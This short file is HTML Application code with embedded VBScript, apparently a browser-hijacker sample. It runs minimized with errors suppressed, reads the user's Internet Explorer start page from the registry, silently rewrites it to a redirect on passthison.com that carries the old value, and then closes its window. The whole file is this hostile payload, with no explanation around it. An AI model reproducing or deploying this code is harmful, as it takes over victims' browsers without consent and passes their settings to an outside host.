   <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'>
   </object><HTA:APPLICATION ID="hO" WINDOWSTATE=Minimize>
   <SCRIPT language=vbscript>
   On Error Resume Next
   set wscr=CreateObject("WScript.Shell")
   Set fso=CreateObject("Scripting.FileSystemObject")
   rr=wscr.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
   If InStr(rr,"passthison.com")=0 Then ss="http://www.passthison.com/r2/?" + rr
   aa=wscr.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",ss)
   End If</SCRIPT><SCRIPT language=javascript>parent.close()</SCRIPT>WW
